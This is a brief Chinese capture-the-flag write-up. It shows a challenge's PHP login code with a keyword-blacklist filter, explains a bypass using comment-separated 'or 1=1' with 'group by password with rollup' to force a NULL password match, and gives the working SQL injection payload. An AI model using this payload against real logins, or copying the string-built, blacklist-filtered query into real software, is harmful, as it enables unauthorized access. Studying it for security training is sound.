#SQL注入 
点击取消，自动下载源码文件index.phps：
```
<?php
		$flag="";
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if (!$con)
        {
            die('Could not connect: ' . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die("sql inject error");
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die("sql inject error");
		}
		$sql="select * from user where username = '$username'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}

					 }
			}
    ?>
```

```
我们使用万能用户名 a'/**/or/**/true/**/# 使SQL成立绕过用户名之后, 后台的SQL会查询出所有的用户信息, 然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同, 这时候我们使用with rollup 对 group by 分组的结果再次进行求和统计, 由于with rollup 不会对group by 分组的字段( password)进行统计, 所以会在返回结果的最后一行用null来填充password, 这样一来我们的返回结果中就有了一个值为null的password , 只要我们登录的时候password输入框什么都不输, 那我么输入的password的值就是null, 跟查询出的用户密码相同( null == null), 从而登录成功！！
原文链接：https://blog.csdn.net/qq_52907838/article/details/120416707
```

```
payload:`username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=`
```

```
'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#
```